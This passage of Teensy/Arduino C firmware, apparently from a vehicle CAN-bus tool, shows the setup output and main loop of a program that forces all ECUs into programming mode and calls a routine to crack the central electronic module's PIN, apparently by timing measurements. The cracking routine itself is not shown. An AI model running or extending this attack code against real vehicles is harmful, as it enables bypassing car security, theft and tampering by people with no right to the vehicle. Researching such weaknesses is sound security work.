
#if defined(TEENSY_MODEL_4X) && defined(PLATFORM_P2)

  /* lowering the Teensy 4.x clock rate provides more consistent results */

  set_arm_clock (180000000);
#endif

  printf ("CPU Maximum Frequency:   %u\n", F_CPU);
#if defined(TEENSY_MODEL_4X)
  printf ("CPU Frequency:           %u\n", F_CPU_ACTUAL);
#endif
  printf ("Execution Rate:          %u cycles/us\n", clockCyclesPerMicrosecond ());
  printf ("Minimum CEM Reply Time:  %uus\n", CEM_REPLY_DELAY_US);
#if defined(PLATFORM_P1)
  printf ("Platform:                P1\n");
#elif defined (PLATFORM_P2)
  printf ("Platform:                P2\n");
#else
  printf ("Platform:                unknown\n");
#endif
  printf ("PIN bytes to measure:    %u\n", CALC_BYTES);
  printf ("Number of samples:       %u\n", SAMPLES);
  printf ("Number of loops:         %u\n\n", NUM_LOOPS);

#if (HW_SELECTION == MCP2515_HW)
  mcp2515Init ();
#elif (HW_SELECTION == TEENSY_CAN_HW)
  flexCanInit ();
#endif /* HW_SELECTION */

  printf ("Initialization done.\n\n");
}

/*******************************************************************************
 *
 * loop - Arduino main loop
 *
 * Returns: N/A
 */

void loop (void)
{
  bool verbose = false;

  /* drain any pending messages */

  while (canMsgReceive (NULL, NULL, false, false) == true)
    ;

  /* put all ECUs into programming mode */

  progModeOn ();

  /* drain any pending messages */

  while (canMsgReceive (NULL, NULL, false, false) == true)
    ;

  /* print the CEM's part number */

  ecuPrintPartNumber (CEM_ECU_ID);

  /* try and crack the PIN */

  cemCrackPin (CALC_BYTES, verbose);

  /* exit ECU programming mode */

  progModeOff ();

  /* all done, stop */

  for (;;) {
  }
}
